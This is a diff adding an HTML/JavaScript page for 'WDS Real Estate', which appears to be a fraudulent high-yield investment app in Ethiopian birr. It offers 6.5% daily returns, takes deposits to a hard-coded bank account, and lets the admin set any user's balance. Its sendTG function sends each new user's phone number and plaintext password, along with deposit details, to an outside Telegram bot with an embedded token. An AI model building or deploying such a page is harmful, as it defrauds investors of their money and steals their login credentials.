@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WDS Real Estate - Professional System</title>
+    <style>
+        :root {
+            --neon-blue: #00f2ea;
+            --neon-pink: #ff0050;
+            --dark-bg: #050505;
+            --card-bg: #121212;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: var(--dark-bg);
+            color: white;
+            margin: 0;
+            padding-bottom: 80px;
+            overflow-x: hidden;
+        }
+
+        /* Neon Alert System (No "File says") */
+        .neon-alert {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            width: 85%; max-width: 400px; background: linear-gradient(135deg, #1a1a1a, #000);
+            border: 2px solid var(--neon-blue); padding: 15px; border-radius: 12px;
+            text-align: center; z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 0 20px var(--neon-blue);
+        }
+        .show-alert { top: 20px; }
+
+        /* Always Visible Balance Header */
+        .header-dashboard {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-bottom: 1px solid var(--neon-blue);
+            text-align: right;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .balance-display {
+            background: var(--glass);
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: 1px solid var(--neon-blue);
+            font-weight: bold;
+            color: var(--neon-blue);
+        }
+
+        /* Product Grid (Real Estate Style) */
+        .product-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            padding: 15px;
+        }
+
+        .product-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #333;
+            transition: 0.3s;
+            position: relative;
+        }
+
+        .product-card img {
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+        }
+
+        .product-info {
+            padding: 10px;
+            font-size: 12px;
+        }
+
+        /* Navigation Bar */
+        .bottom-nav {
+            position: fixed; bottom: 0; width: 100%; background: #000;
+            display: flex; justify-content: space-around; padding: 12px 0;
+            border-top: 1px solid var(--neon-blue); z-index: 1000;
+        }
+
+        .nav-item { color: #666; font-size: 11px; text-align: center; cursor: pointer; }
+        .nav-item.active { color: var(--neon-blue); font-weight: bold; }
+
+        /* Admin Styles */
+        .admin-card {
+            background: #1a1a1a;
+            margin: 10px;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 5px solid lime;
+        }
+
+        .hidden { display: none !important; }
+        .btn-main {
+            background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue));
+            border: none; color: white; padding: 12px; border-radius: 8px;
+            width: 100%; font-weight: bold; cursor: pointer; margin-top: 5px;
+        }
+        
+        input, select {
+            width: 90%; padding: 12px; margin: 8px 0; background: #111;
+            border: 1px solid #333; color: white; border-radius: 8px;
+        }
+
+        /* Gift Box */
+        .gift-box {
+            position: fixed; top: 150px; left: 20px; font-size: 40px;
+            z-index: 900; cursor: pointer; animation: bounce 2s infinite;
+        }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+    </style>
+</head>
+<body>
+
+<div id="alertBox" class="neon-alert"></div>
+
+<div id="page-auth" style="padding: 60px 20px; text-align: center;">
+    <h1 style="color: var(--neon-blue); font-family: 'Orbitron', sans-serif;">WDS DIGITAL</h1>
+    <div id="auth-container">
+        <input type="text" id="user-ph" placeholder="Phone Number (Silkii)">
+        <input type="password" id="user-pw" placeholder="Password">
+        <button class="btn-main" onclick="handleAuth()">LOGIN / SIGN UP</button>
+    </div>
+</div>
+
+<div id="page-main" class="hidden">
+    <div id="bonus-gift" class="gift-box" onclick="claimBonus()">🎁</div>
+    
+    <div class="header-dashboard">
+        <span id="display-name" style="font-size: 12px; color: #aaa;">User</span>
+        <div class="balance-display">ETB <span id="main-balance">0.00</span></div>
+    </div>
+
+    <div id="sub-home" class="product-grid"></div>
+
+    <div id="sub-task" class="hidden" style="padding: 20px;">
+        <h3>Daily Tasks</h3>
+        <div id="task-container"></div>
+    </div>
+
+    <div id="sub-finance" class="hidden" style="padding: 20px;">
+        <h3>Finance</h3>
+        <div style="background: var(--glass); padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <p>Deposit Account (CBE): <b id="cbe-acc" onclick="copyText('1000705884987')">1000705884987</b> (Copy)</p>
+            <input type="number" id="recharge-amt" placeholder="Amount">
+            <input type="text" id="recharge-ft" placeholder="FT Number">
+            <button class="btn-main" onclick="submitRecharge()">Submit Recharge</button>
+        </div>
+        <div style="background: var(--glass); padding: 15px; border-radius: 10px;">
+            <p>Withdraw (Min 200 ETB)</p>
+            <input type="number" id="wd-amt" placeholder="Amount">
+            <input type="text" id="wd-name" placeholder="Full Name">
+            <input type="text" id="wd-acc" placeholder="Account Number">
+            <button class="btn-main" style="background: var(--neon-pink);" onclick="submitWithdraw()">Withdraw Funds</button>
+        </div>
+    </div>
+
+    <div id="sub-settings" class="hidden" style="padding: 20px;">
+        <h3>Settings</h3>
+        <button class="btn-main" onclick="copyInviteLink()">Copy Invite Link</button>
+        <select id="lang-switcher" onchange="changeLanguage(this.value)">
+            <option value="en">English</option>
+            <option value="om">Afaan Oromoo</option>
+            <option value="am">Amharic</option>
+        </select>
+        <button class="btn-main" style="background: #333;" onclick="logout()">Log Out</button>
+    </div>
+
+    <div id="sub-admin" class="hidden" style="padding: 20px;">
+        <h2 style="color: lime;">Admin Panel</h2>
+        <div id="admin-users"></div>
+        <hr>
+        <h3>Pending Deposits</h3>
+        <div id="admin-deposits"></div>
+    </div>
+
+    <nav class="bottom-nav">
+        <div class="nav-item active" onclick="showSub('home', this)">🏠<br>Home</div>
+        <div class="nav-item" onclick="showSub('task', this)">📋<br>Task</div>
+        <div class="nav-item" onclick="showSub('finance', this)">💰<br>Finance</div>
+        <div class="nav-item" onclick="showSub('settings', this)">⚙️<br>Settings</div>
+        <div id="nav-admin" class="nav-item hidden" onclick="showSub('admin', this)">👑<br>Admin</div>
+    </nav>
+</div>
+
+<script>
+    const ADMIN_PH = "0975780412";
+    const TG_TOKEN = "86449777708703665809:AAGLk0uCFBA96e4PaVDP2KVufX1hnGzVGpca";
+    const CHAT_ID = "580905563319";
+
+    // Local Storage Data (Persist on refresh)
+    let db = JSON.parse(localStorage.getItem('wds_data')) || { users: {}, requests: [] };
+    let currentUser = localStorage.getItem('active_user');
+
+    function handleAuth() {
+        const ph = document.getElementById('user-ph').value;
+        const pw = document.getElementById('user-pw').value;
+
+        if(!ph || !pw) return showNotice("Fill all fields!");
+
+        if(!db.users[ph]) {
+            db.users[ph] = { ph, pw, balance: 0, plans: [], bonus: false, lang: 'en', tasks: {} };
+            sendTG(`🆕 NEW USER\nPhone: ${ph}\nPass: ${pw}`);
+        }
+
+        if(db.users[ph].pw === pw) {
+            currentUser = ph;
+            localStorage.setItem('active_user', ph);
+            save();
+            initDashboard();
+        } else {
+            showNotice("Wrong Password!");
+        }
+    }
+
+    function initDashboard() {
+        document.getElementById('page-auth').classList.add('hidden');
+        document.getElementById('page-main').classList.remove('hidden');
+        document.getElementById('display-name').innerText = currentUser;
+        
+        if(currentUser === ADMIN_PH) document.getElementById('nav-admin').classList.remove('hidden');
+        
+        updateBalanceUI();
+        renderProducts();
+        if(db.users[currentUser].bonus) document.getElementById('bonus-gift').classList.add('hidden');
+    }
+
+    function renderProducts() {
+        const cont = document.getElementById('sub-home');
+        cont.innerHTML = "";
+        for(let i=1; i<=15; i++) {
+            let dep = 1000 + (i-1)*2000;
+            let daily = dep * 0.065;
+            let isOwned = db.users[currentUser].plans.includes('F'+i);
+            
+            cont.innerHTML += `
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1564013799919-ab600027ffc6?auto=format&fit=crop&w=300&q=80&sig=${i}">
+                    <div class="product-info">
+                        <b>F${i} Real Estate</b><br>
+                        Deposit: ${dep} ETB<br>
+                        Daily: ${daily.toFixed(0)} ETB
+                        <button class="btn-main" onclick="buyPlan(${dep}, 'F${i}')" ${isOwned ? 'disabled' : ''}>
+                            ${isOwned ? 'INVESTED ✅' : 'INVEST'}
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+    }
+
+    function buyPlan(cost, id) {
+        const u = db.users[currentUser];
+        if(u.balance < cost) return showNotice("Insufficient Balance!");
+        u.balance -= cost;
+        u.plans.push(id);
+        save();
+        updateBalanceUI();
+        renderProducts();
+        showNotice(`Invested in ${id}!`);
+    }
+
+    function submitRecharge() {
+        const amt = document.getElementById('recharge-amt').value;
+        const ft = document.getElementById('recharge-ft').value;
+        if(!amt || !ft) return showNotice("Fill all fields!");
+
+        db.requests.push({ id: Date.now(), ph: currentUser, amt: parseFloat(amt), ft: ft, status: 'pending', type: 'recharge' });
+        save();
+        sendTG(`💰 DEPOSIT\nUser: ${currentUser}\nAmt: ${amt}\nFT: ${ft}`);
+        showNotice("Request sent! Waiting for approval.");
+    }
+
+    function submitWithdraw() {
+        const amt = parseFloat(document.getElementById('wd-amt').value);
+        const u = db.users[currentUser];
+        if(amt < 200) return showNotice("Minimum 200 ETB!");
+        if(u.balance < amt) return showNotice("Balance too low!");
+
+        u.balance -= amt; // Deduct immediately
+        db.requests.push({ id: Date.now(), ph: currentUser, amt: amt, status: 'pending', type: 'withdraw' });
+        save();
+        updateBalanceUI();
+        sendTG(`💸 WITHDRAW\nUser: ${currentUser}\nAmt: ${amt}`);
+        showNotice("Withdrawal pending approval.");
+    }
+
+    function claimBonus() {
+        const u = db.users[currentUser];
+        if(u.bonus) return;
+        u.balance += 100;
+        u.bonus = true;
+        document.getElementById('bonus-gift').classList.add('hidden');
+        save();
+        updateBalanceUI();
+        showNotice("ETB 100 Bonus Received!");
+    }
+
+    // --- ADMIN CONTROLS ---
+    function renderAdmin() {
+        const uCont = document.getElementById('admin-users');
+        uCont.innerHTML = "<h4>All Users</h4>";
+        Object.values(db.users).forEach(u => {
+            uCont.innerHTML += `
+                <div class="admin-card">
+                    <b>${u.ph}</b> | Bal: ${u.balance.toFixed(2)}<br>
+                    <button onclick="adminEditBal('${u.ph}')">Edit Bal</button>
+                </div>
+            `;
+        });
+
+        const rCont = document.getElementById('admin-deposits');
+        rCont.innerHTML = "";
+        db.requests.filter(r => r.status === 'pending').forEach(r => {
+            rCont.innerHTML += `
+                <div class="admin-card" style="border-left-color: gold;">
+                    Type: ${r.type} | User: ${r.ph}<br>
+                    Amt: ${r.amt} | FT: ${r.ft || 'N/A'}<br>
+                    <button onclick="adminApprove(${r.id})">Approve</button>
+                </div>
+            `;
+        });
+    }
+
+    function adminApprove(id) {
+        const rIdx = db.requests.findIndex(r => r.id === id);
+        const r = db.requests[rIdx];
+        if(r.type === 'recharge') {
+            db.users[r.ph].balance += r.amt;
+        }
+        r.status = 'approved';
+        save();
+        renderAdmin();
+        updateBalanceUI();
+        showNotice("Approved Successfully!");
+    }
+
+    function adminEditBal(ph) {
+        let val = prompt("Enter new balance for " + ph);
+        if(val !== null) {
+            db.users[ph].balance = parseFloat(val);
+            save();
+            renderAdmin();
+            updateBalanceUI();
+        }
+    }
+
+    // --- CORE UTILS ---
+    function showSub(page, el) {
+        document.querySelectorAll('[id^="sub-"]').forEach(s => s.classList.add('hidden'));
+        document.getElementById('sub-' + page).classList.remove('hidden');
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        el.classList.add('active');
+        if(page === 'admin') renderAdmin();
+        if(page === 'task') renderTasks();
+    }
+
+    function renderTasks() {
+        const cont = document.getElementById('task-container');
+        cont.innerHTML = "";
+        const u = db.users[currentUser];
+        if(u.plans.length === 0) cont.innerHTML = "No active investments. Buy a plan first.";
+        
+        u.plans.forEach(id => {
+            let idx = parseInt(id.replace('F', ''));
+            let profit = (1000 + (idx-1)*2000) * 0.065;
+            let last = u.tasks[id] || 0;
+            let canClaim = (Date.now() - last) > 86400000;
+
+            cont.innerHTML += `
+                <div class="admin-card" style="border-left-color: var(--neon-blue);">
+                    <b>${id} Estate</b> | Daily Profit: ${profit.toFixed(0)} ETB<br>
+                    <button class="btn-main" onclick="claimTask('${id}', ${profit})" ${canClaim ? '' : 'disabled'}>
+                        ${canClaim ? 'Claim Profit' : 'Locked (24h)'}
+                    </button>
+                </div>
+            `;
+        });
+    }
+
+    function claimTask(id, amt) {
+        db.users[currentUser].balance += amt;
+        db.users[currentUser].tasks[id] = Date.now();
+        save();
+        updateBalanceUI();
+        renderTasks();
+        showNotice(`Claimed ${amt} ETB!`);
+    }
+
+    function updateBalanceUI() {
+        document.getElementById('main-balance').innerText = db.users[currentUser].balance.toFixed(2);
+    }
+
+    function showNotice(msg) {
+        const b = document.getElementById('alertBox');
+        b.innerText = msg; b.classList.add('show-alert');
+        setTimeout(() => b.classList.remove('show-alert'), 3000);
+    }
+
+    function save() { localStorage.setItem('wds_data', JSON.stringify(db)); }
+    function logout() { localStorage.removeItem('active_user'); location.reload(); }
+    function sendTG(m) { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
+    function copyText(t) { navigator.clipboard.writeText(t); showNotice("Copied CBE Account!"); }
+
+    // Init if logged in
+    if(currentUser) initDashboard();
+
+</script>
+</body>
+</html>
